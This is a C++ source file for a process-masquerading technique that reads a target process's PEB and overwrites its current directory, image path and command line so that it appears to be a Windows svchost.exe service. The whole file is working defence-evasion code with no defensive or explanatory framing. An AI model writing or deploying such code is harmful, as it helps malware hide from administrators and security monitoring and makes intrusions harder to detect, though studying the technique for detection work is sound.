#include <Windows.h>
#include <Tlhelp32.h>
#include <winternl.h>
#include "structs.h"

#define FAKE_MODULE L"svchost.exe"
#define FAKE_MODULE_PATH L"C:\\Windows\\System32\\svchost.exe"
#define FAKE_CMDLINE L"C:\\Windows\\System32\\svchost.exe -k UnistackSvcGroup -s WpnUserService"
#define FAKE_CWD L"C:\\Windows\\System32\\"

class PEBManipulation {
public:
	typedef NTSTATUS(WINAPI* NtQueryInformationProcess_t)(
		IN HANDLE,
		IN PROCESSINFOCLASS,
		OUT PVOID,
		IN ULONG,
		OUT PULONG
		);

	int paramsManipulation(HANDLE hProc) {
		PROCESS_BASIC_INFORMATION pbi;
		DWORD retLen;
		SIZE_T bytesOut;
		mPEB pebLocal;
		RTL_USER_PROCESS_PARAMS params = { sizeof(params) };
		CURDIR cwd = { sizeof(cwd) };
		USHORT fakeSize = 0;

		// resolve the API and get the information block about the target process
		NtQueryInformationProcess_t pNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
		pNtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

		// Read the PEB from the target process
		if (!ReadProcessMemory(hProc, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesOut)) {
			// Failed to read PEB

			return 12;
		}

		// Grab the ProcessParameters from PEB
		if (!ReadProcessMemory(hProc, pebLocal.ProcessParameters, &params, sizeof(params), &bytesOut)) {
			return 1;
		}

		// Update CurrentDirectory in remote PEB
		fakeSize = wcslen(FAKE_CWD) * 2;
		if (params.CurrentDirectory.DosPath.Length < fakeSize) {
			return 1;
		}
		if (!WriteProcessMemory(hProc, params.CurrentDirectory.DosPath.Buffer, (LPCVOID)FAKE_CWD, sizeof(FAKE_CWD), &bytesOut)) {
			return 1;
		}
		if (!WriteProcessMemory(hProc, (char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, CurrentDirectory.DosPath.Length), (void*)&fakeSize, 2, &bytesOut)) {
			return 1;
		}

		// Update ImagePathName in remote PEB
		fakeSize = wcslen(FAKE_MODULE_PATH) * 2;
		if (params.ImagePathName.Length < fakeSize) {
			return 1;
		}
		if (!WriteProcessMemory(hProc, params.ImagePathName.Buffer, (LPCVOID)FAKE_MODULE_PATH, sizeof(FAKE_MODULE_PATH), &bytesOut)) {
			return 1;
		}
		if (!WriteProcessMemory(hProc, (char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, ImagePathName.Length), (void*)&fakeSize, 2, &bytesOut)) {
			return 1;
		}

		// Update CommandLine in remote PEB
		fakeSize = wcslen(FAKE_CMDLINE) * 2;
		if (params.CommandLine.Length < fakeSize) {
			return 1;
		}
		if (!WriteProcessMemory(hProc, params.CommandLine.Buffer, (LPCVOID)FAKE_CMDLINE, sizeof(FAKE_CMDLINE), &bytesOut)) {
			return 1;
		}
		if (!WriteProcessMemory(hProc, (char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMS, CommandLine.Length), (void*)&fakeSize, 2, &bytesOut)) {
			OutputDebugString(L"Failed to write CommandLine.Length");
			// SHow error with GetLastError
			OutputDebugString(L"Error: ");
			OutputDebugString(std::to_wstring(GetLastError()).c_str());
			return 19;
		}

		return 0;
	}
};